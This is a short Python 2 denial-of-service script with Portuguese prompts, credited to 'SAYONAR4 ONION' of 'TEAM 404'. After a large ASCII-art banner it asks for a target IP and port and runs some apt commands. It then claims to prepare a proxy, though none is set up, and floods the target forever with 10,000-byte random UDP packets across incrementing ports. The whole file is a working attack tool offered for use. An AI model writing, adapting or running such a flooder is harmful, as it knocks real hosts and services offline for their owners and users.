#!/usr/bin

#codded by SAYONAR4 ONION

#FAMILIA TEAM 404 THE HELL

import sys
import os
import time
import socket
import random

from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout =  time.time() 

os.system ("clear")
print '''                 \033[94m.@@:       !@@@@:       .@@@
     !@@:     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.     :@@!
   .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.
    :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     !@@@@@@@@@@@@@@:                    .@@@@@@@@@@@@@@!
       @@#:                                         #@@\033[0m
       \033[91m#.        ##@@@#@@@.        .@@@@@@#@@         !
       #.        ###@@@@@#.        .##@@@@@@#         !
       #.        ##@@@@@##.        .@@@@@###@         !
       #.        #@@@@@@@#.        .#@@@@@@@@         !
       #@#@@@#@@@         !@@@@@@@@!         @@@#@@@@@@
       ##@@@@@@@@         !@#@@@@@@!         @@@@@@#@@@
       ##@@@@@##@         !@##@#@@@!         @@@@@@@@@@
       #.        !@@@#@#@@.        .@#@@@@#@@         !
       #.        !@@@@@#@@.        .@@@@@@@@#         !
       #.        !@#@#@@@@.        .@@@@@@@@#         !
       :.        :########.        .#########         !
       :@#@@@@@#@         !@@@@@#@#!         ###@@@###.
        :#@#@@#@@         !@@@@@##@!         @@@@@@@@!
         .#@@@#@@         !@@@##@@@!         ##@@@@#
            !.   !@@@#@@@@.        .@@@@@#@@#   .#.
              .# !@@@@@@@#.        .#@@@@#@##.#.
                  :#@@@#@@.        .#@@@@@@!
                         .##########:\033[0m

\033[92m404404404404404404404404404404404404404404404404404404404404404404\033[0m

\033[91mCODDED BY\033[0m : \033[93mSAYONAR4-ONION\033[0m          \033[94m_  _    ___  _  _\033[0m
                                   \033[94m| || |  / _ \| || |\033[0m
\033[91mEM MEMORIA A\033[0m : \033[93mTEAM 404\033[0m.           \033[94m| || |_| | | | || |_\033[0m
                                   \033[94m|__   _| |_| |__   _|\033[0m
\033[93mPAGE NOT FOUND 404\033[0m                    \033[94m|_|  \___/   |_|\033[0m

\033[92m404404404404404404404404404404404404404404404404404404404404404404\033[0m

\033[94m    d8888   .d8888b.      d8888    8888888b.   .d88888b.   .d8888b.
   d8P888  d88P  Y88b    d8P888    888  "Y88b d88P" "Y88b d88P  Y88b
  d8P 888  888    888   d8P 888    888    888 888     888 Y88b.
 d8P  888  888    888  d8P  888    888    888 888     888  "Y888b.
d88   888  888    888 d88   888    888    888 888     888     "Y88b.
8888888888 888    888 8888888888   888    888 888     888       "888
      888  Y88b  d88P       888    888  .d88P Y88b. .d88P Y88b  d88P
      888   "Y8888P"        888    8888888P"   "Y88888P"   "Y8888P"\033[0m
'''

ip = raw_input("IP Alvo : ")
port = input("Porta padrao 80   : ")

os.system("clear")
print '''
\033[94m================================

Atualizando pacotes aguarde...

================================\033[0m
'''

os.system("apt-get upgrade")
os.system("apt-get update")
os.system("apt install figlet")
print "pacotes instalados"
time.sleep(1)

print '''
\033[94m================================

Preparando Proxy... | use vpn |

================================\033[0m
'''
time.sleep(2)
print " proxy pronto"
time.sleep(1)
print "COMECANDO ATAQUE DOS"
os.system("figlet GO 404")
os.system ("clear")
sent = 0
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[91m[+]\033[0m \033[94mataque by 404\033[0m"
     print "\033[94m%s %s %s\033[0m"%(sent,ip,port)
     if port == 65534:
       port = 1
